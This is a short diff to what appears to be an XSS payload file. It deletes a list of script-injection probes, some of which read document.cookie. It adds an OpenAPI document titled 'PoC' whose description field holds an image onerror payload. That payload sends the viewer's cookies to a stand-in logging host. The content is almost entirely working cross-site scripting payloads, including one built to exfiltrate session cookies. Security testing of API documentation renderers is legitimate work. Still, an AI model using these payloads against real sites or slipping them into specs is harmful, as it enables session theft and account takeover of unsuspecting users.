@@ -1,7 +1,9 @@
-
-'-alert?(1)-'
-"><img src=q onerror=confirm?.(1)>
-#<script>alert(1)</script>
-1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
-#javascript:alert(2);
-"><svg onload=alert(1)>
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "PoC",
+    "version": "1.0.0",
+    "description": "<img src=x onerror=\"fetch('https://YOURLOGSERVER.example/log?c='+encodeURIComponent(document.cookie))\">"
+  },
+  "paths": {}
+}
